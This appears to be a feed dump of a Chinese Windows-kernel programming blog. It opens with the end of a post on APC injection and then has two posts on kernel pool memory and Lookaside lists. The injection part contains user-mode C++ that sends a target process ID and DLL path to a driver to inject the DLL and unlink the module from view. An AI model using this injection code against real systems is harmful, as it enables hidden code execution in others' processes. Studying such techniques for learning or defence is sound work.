class="keyword">struct</span> <span class="title class_">_INJECTION_INFORMATION_</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">wchar_t</span>     DllFullPath[MAX_PATH];<span class="comment">// 当前DLL完整路径</span></span><br><span class="line">ULONG       TargetProcessID;<span class="comment">// 目标进程ID</span></span><br><span class="line">UCHAR       IsUnlinkModule;  <span class="comment">// 是否卸载模块</span></span><br><span class="line">&#125;INJECTION_INFORMATION, *PINJECTION_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">ApcInjection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS  Status;</span><br><span class="line">ULONG  TargetProcessID = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; TargetProcessID;<span class="comment">// 输入进程ID</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">wchar_t</span>* DllName = <span class="string">L&quot;Dll.dll&quot;</span>;</span><br><span class="line">wstring DllFullPath;</span><br><span class="line"><span class="comment">// 获取当前可执行文件的路径，并将DllName与路径拼接起来，得到完整的DLL路径</span></span><br><span class="line">DllFullPath = <span class="built_in">GetExeDirectory</span>() + <span class="string">L&quot;\\&quot;</span> + DllName;   <span class="comment">//选择编译</span></span><br><span class="line">CControlDevice  Object;</span><br><span class="line"><span class="comment">// 打开设备对象</span></span><br><span class="line"><span class="keyword">if</span> (!Object.<span class="built_in">SeOpenDeviceObject</span>(DEVICE_LINK_NAME))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">INJECTION_INFORMATION InjectionInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">InjectionInfo.TargetProcessID = TargetProcessID;</span><br><span class="line">InjectionInfo.IsUnlinkModule = TRUE;</span><br><span class="line"><span class="built_in">wcscpy_s</span>(InjectionInfo.DllFullPath, DllFullPath.<span class="built_in">c_str</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送INJECTION_INFORMATION结构体和控制码</span></span><br><span class="line">Status = Object.<span class="built_in">SeDeviceIoControl</span>(&amp;InjectionInfo,<span class="built_in">sizeof</span>(INJECTION_INFORMATION),CTL_APC_INJECTION);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;CTL_APC_INJECTION Error\r\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;CTL_APC_INJECTION Succeeded\r\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Input AnyKey To Exit\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Ring3操作驱动方法类"><a href="#Ring3操作驱动方法类" class="headerlink" title="Ring3操作驱动方法类"></a>Ring3操作驱动方法类</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CControlDevice</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">CControlDevice</span>();</span><br><span class="line">~<span class="built_in">CControlDevice</span>();</span><br><span class="line"><span class="function">BOOL <span class="title">CControlDevice::SeOpenDeviceObject</span><span class="params">(WCHAR* DeviceLinkName)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">CControlDevice::SeDeviceIoControl</span><span class="params">(PVOID BufferData, ULONG BufferLength, ULONG IoControlCode)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">HANDLE m_DeviceObject = INVALID_HANDLE_VALUE;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="获取Exe的完整名字"><a href="#获取Exe的完整名字" class="headerlink" title="获取Exe的完整名字"></a>获取Exe的完整名字</h4><p>获取当前第一模块（可执行文件）路径，在路径中去掉文件名，再做一些转换</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">wstring <span class="title">GetExeDirectory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">wchar_t</span> BufferData[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD BufferLength = <span class="built_in">ARRAYSIZE</span>(BufferData);</span><br><span class="line"><span class="built_in">GetModuleFileNameW</span>(<span class="literal">NULL</span>, BufferData, BufferLength);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">GetParentDirectory</span>(BufferData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">wstring <span class="title">GetParentDirectory</span><span class="params">(<span class="type">const</span> std::wstring&amp; BufferData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (BufferData.<span class="built_in">empty</span>())</span><br><span class="line"><span class="keyword">return</span> BufferData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> v1 = BufferData.<span class="built_in">rfind</span>(<span class="string">L&#x27;\\&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (v1 == BufferData.npos)</span><br><span class="line">v1 = BufferData.<span class="built_in">rfind</span>(<span class="string">L&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (v1 != BufferData.npos)</span><br><span class="line"><span class="keyword">return</span> BufferData.<span class="built_in">substr</span>(<span class="number">0</span>, v1);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> BufferData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="打开设备对象"><a href="#打开设备对象" class="headerlink" title="打开设备对象"></a>打开设备对象</h4><p>通过链接对象获取驱动设备对象</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CControlDevice::SeOpenDeviceObject</span><span class="params">(WCHAR* DeviceLinkName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//通过LinkName 获得驱动设备对象</span></span><br><span class="line"><span class="keyword">if</span> (m_DeviceObject != INVALID_HANDLE_VALUE)</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Try to open handle to existing driver</span></span><br><span class="line">m_DeviceObject = <span class="built_in">CreateFileW</span>(</span><br><span class="line">DeviceLinkName,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line"><span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_DeviceObject != INVALID_HANDLE_VALUE)</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="发送IO控制码"><a href="#发送IO控制码" class="headerlink" title="发送IO控制码"></a>发送IO控制码</h4><p>最重要的DeviceIoControl</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">CControlDevice::SeDeviceIoControl</span><span class="params">(PVOID BufferData,ULONG BufferLength,ULONG IoControlCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD ReturnLength = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_DeviceObject == INVALID_HANDLE_VALUE)</span><br><span class="line"><span class="keyword">return</span> STATUS_DEVICE_DOES_NOT_EXIST;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">DeviceIoControl</span>(m_DeviceObject, IoControlCode, BufferData, BufferLength, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;ReturnLength, <span class="literal">NULL</span>))</span><br><span class="line"><span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>32位区别基本仅在ShellCode只有32位一种。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;APC注入&quot;&gt;&lt;a href=&quot;#APC注入&quot; class=&quot;headerlink&quot; title=&quot;APC注入&quot;&gt;&lt;/a&gt;APC注入&lt;/h1&gt;&lt;h2 id=&quot;APC机制&quot;&gt;&lt;a href=&quot;#APC机制&quot; class=&quot;headerlink&quot; title=&quot;APC</summary>
      
    
    
    
    <category term="Windows Kernel" scheme="https://qianmuoy.github.io/categories/Windows-Kernel/"/>
    
    
  </entry>
  
  <entry>
    <title>使用内核内存</title>
    <link href="https://qianmuoy.github.io/2024/03/09/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%86%85%E5%AD%98/"/>
    <id>https://qianmuoy.github.io/2024/03/09/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%86%85%E5%AD%98/</id>
    <published>2024-03-09T12:39:58.000Z</published>
    <updated>2024-03-09T12:40:11.080Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用内核内存"><a href="#使用内核内存" class="headerlink" title="使用内核内存"></a>使用内核内存</h1><p>wdm给出的使用内存池方法</p><p>申请内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PVOID <span class="title function_">AllocateBuffer</span><span class="params">(ULONG ViewSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID VirtualAddress = ExAllocatePool(NonPagedPool, ViewSize);</span><br><span class="line">    <span class="keyword">if</span> (VirtualAddress != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        RtlZeroMemory(VirtualAddress, ViewSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> VirtualAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">FreeBuffer</span><span class="params">(PVOID VirtualAddress)</span></span><br><span class="line">&#123;</span><br><span class="line">    ExFreePool(VirtualAddress);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>new 和delete 关键字在驱动里面是不可以使用，通过重载的方式即可在内核中使用，并通过c++编译器来编译。使用面向对象时，DriverEntry系列函数需要extern “C”</p><p>内部重载</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span>   </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Myclass</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Myclass</span>() </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;构造函数\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">Myclass</span>() </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;析构函数\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> * _cdecl <span class="keyword">operator</span> <span class="title">new</span> <span class="params">(<span class="type">size_t</span> size,POOL_TYPE poolType= PagedPool)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;进入new\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">ExAllocatePoolWithTag</span>(poolType,size,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> _cdecl <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *p)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;进入delete\n&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (p!=<span class="literal">NULL</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ExFreePoolWithTag</span>(p, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Unload</span><span class="params">(IN PDRIVER_OBJECT pDriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//驱动卸载的时候显示</span></span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;Goodbye driver\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">IN PDRIVER_OBJECT DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">IN PUNICODE_STRING RegistryPath</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DriverObject-&gt;DriverUnload = Unload;</span><br><span class="line">Myclass *pMyclass = <span class="keyword">new</span> <span class="built_in">Myclass</span>();</span><br><span class="line"><span class="keyword">delete</span> pMyclass;</span><br><span class="line"> <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全局重载 一个实例，可以直接套用<a href="https://www.pnpon.com/article/detail-163.html">Windows内核驱动中使用new和delete - PNPON内核开发</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg(<span class="string">&quot;PAGE&quot;</span>)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// New and delete operators</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">_When_((PoolType &amp; NonPagedPoolMustSucceed) != <span class="number">0</span>,</span><br><span class="line">    __drv_reportError(<span class="string">&quot;Must succeed pool allocations are forbidden. &quot;</span></span><br><span class="line">            <span class="string">&quot;Allocation failures cause a system crash&quot;</span>))</span><br><span class="line"><span class="function"><span class="type">void</span>* __cdecl <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> Size, POOL_TYPE PoolType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line">    Size = (Size != <span class="number">0</span>) ? Size : <span class="number">1</span>;</span><br><span class="line">    <span class="type">void</span>* pObject = <span class="built_in">ExAllocatePoolWithTag</span>(PoolType, Size, BDDTAG);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DBG</span></span><br><span class="line">    <span class="keyword">if</span> (pObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">RtlFillMemory</span>(pObject, Size, <span class="number">0xCD</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DBG</span></span></span><br><span class="line">    <span class="keyword">return</span> pObject;</span><br><span class="line">&#125;</span><br><span class="line">_When_((PoolType &amp; NonPagedPoolMustSucceed) != <span class="number">0</span>,</span><br><span class="line">    __drv_reportError(<span class="string">&quot;Must succeed pool allocations are forbidden. &quot;</span></span><br><span class="line">            <span class="string">&quot;Allocation failures cause a system crash&quot;</span>))</span><br><span class="line"><span class="type">void</span>* __cdecl <span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="type">size_t</span> Size, POOL_TYPE PoolType)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line">    Size = (Size != <span class="number">0</span>) ? Size : <span class="number">1</span>;</span><br><span class="line">    <span class="type">void</span>* pObject = <span class="built_in">ExAllocatePoolWithTag</span>(PoolType, Size, BDDTAG);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DBG</span></span><br><span class="line">    <span class="keyword">if</span> (pObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">RtlFillMemory</span>(pObject, Size, <span class="number">0xCD</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DBG</span></span></span><br><span class="line">    <span class="keyword">return</span> pObject;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span>* pObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line">    <span class="keyword">if</span> (pObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExFreePool</span>(pObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __cdecl <span class="keyword">operator</span> <span class="keyword">delete</span>[](<span class="type">void</span>* pObject)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line">    <span class="keyword">if</span> (pObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExFreePool</span>(pObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码来看，new和delete运算符的重载依然是对ExAllocatePoolWithTag和ExFreePool函数的封装。</p><p>这里说明一下，在dbg模式下，将分配的内存全部置为0xcd,这和应用层在调试模式下堆的内存初始化一样的道理。</p><p>0xcd其实这里是int指令的指令，再配合一个cd,就变成了int cd,说明直接行的是中断0xcd,这样CPU执行到此处就会出现中断异常。这和栈上的0xcc,int3的原理一致。</p><p>简单版。同样的，这种重载对于类也有效。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span>* __cdecl <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, size, <span class="string">&#x27;yTag&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span>* p,<span class="type">size_t</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">ExFreePool</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* __cdecl <span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="type">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, size, <span class="string">&#x27;yTag&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __cdecl <span class="keyword">operator</span> <span class="keyword">delete</span>[](<span class="type">void</span>* p)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ExFreePool</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CBase</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">&#125;;</span><br><span class="line">   CBase* p = (CBase*)<span class="keyword">new</span> <span class="built_in">CBase</span>();  <span class="comment">//operator new(size_t size)</span></span><br><span class="line">   p-&gt;a = <span class="number">10</span>;</span><br><span class="line">   <span class="keyword">delete</span> p; <span class="comment">//void __cdecl operator delete(void* p,size_t a)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用内核内存&quot;&gt;&lt;a href=&quot;#使用内核内存&quot; class=&quot;headerlink&quot; title=&quot;使用内核内存&quot;&gt;&lt;/a&gt;使用内核内存&lt;/h1&gt;&lt;p&gt;wdm给出的使用内存池方法&lt;/p&gt;
&lt;p&gt;申请内存&lt;/p&gt;
&lt;figure class=&quot;highlight</summary>
      
    
    
    
    <category term="Windows Kernel" scheme="https://qianmuoy.github.io/categories/Windows-Kernel/"/>
    
    
  </entry>
  
  <entry>
    <title>使用Lookaside内存</title>
    <link href="https://qianmuoy.github.io/2024/03/09/%E4%BD%BF%E7%94%A8Lookaside%E5%86%85%E5%AD%98/"/>
    <id>https://qianmuoy.github.io/2024/03/09/%E4%BD%BF%E7%94%A8Lookaside%E5%86%85%E5%AD%98/</id>
    <published>2024-03-09T12:39:17.000Z</published>
    <updated>2024-03-09T12:39:37.065Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用Lookaside内存"><a href="#使用Lookaside内存" class="headerlink" title="使用Lookaside内存"></a>使用Lookaside内存</h1><p>频繁申请和回收内存，会导致在内存上产生大量的内存“空洞”，从 而导致最终无法申请内存。DDK为程序员提供了Lookaside结构来解决这个问题。</p><p>频繁地申请内存，会导致一个问题，就是在内存中产生“空洞”。图 5-11显示了这种情况，在内存中先后申请三块内存。最开始可用的内 存是连续的。当某个时刻内存块2被回收以后，如果系统想分配一块略 微大于原先内存块2的内存，这时候原先的内存2就不能被申请成功。 因此，频繁地申请、回收内存会导致在内存上产生大量的内存“空洞”。</p><p><img src="/.io//image-20240217165148212.png" alt="image-20240217165148212"></p><p>如果系统中存在大量的内存“空洞”，即使内存中有大量的可用内 存，也会导致申请内存失败。在操作系统空闲的时候，系统会整理内 存中的“空洞”，将内存中的“空洞”进行合并。</p><p>如果驱动程序需要频繁地从内存中申请、回收固定大小的内存，DDK提 供了一种机制来解决这个问题，这就是使用Lookaside对象。 可以将Lookaside对象想象成一个内存容器。在初始的时候，它先向 Windows申请了一块比较大的内存。以后程序员每次申请内存的时候， 不是直接向Windows申请内存，而是向Lookaside对象申请内存。 Lookaside对象会智能地避免产生内存“空洞”。如果Lookaside对象 内部的内存不够用时，它会向操作系统申请更多的内存。当Lookaside 对象内部有大量的未使用的内存时，它会自动让Windows回收一部分内存。总之，Lookaside是一个自动的内存分配容器。通过对Lookaside 对象申请内存，效率要高于直接向Windows申请内存。Lookaside一般 会在以下情况使用： </p><p>（1）程序员每次申请固定大小的内存。 </p><p>（2）申请和回收的操作十分频繁。 </p><p>如果程序员遇到上述两种情况，可以考虑使用Lookaside对象。驱动程序中的运行效率是程序员必须考虑的问题。</p><h2 id="使用Lookaside内存的方法"><a href="#使用Lookaside内存的方法" class="headerlink" title="使用Lookaside内存的方法"></a>使用Lookaside内存的方法</h2><ol><li>初始化Lookaside结构</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">_IRQL_requires_max_(DISPATCH_LEVEL)</span><br><span class="line"><span class="function">NTKERNELAPI</span></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">ExInitializeNPagedLookasideList</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PNPAGED_LOOKASIDE_LIST Lookaside,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PALLOCATE_FUNCTION Allocate,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PFREE_FUNCTION Free,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ ULONG Flags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T Size,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ ULONG Tag,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ USHORT Depth</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitializeLookAsideList</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (__IsLookAsideList == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExInitializeNPagedLookasideList</span>(&amp;__LookAsideList, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, BUFFER_SIZE_MAX, <span class="string">&#x27;XXXX&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">        __IsLookAsideList = TRUE;</span><br><span class="line">    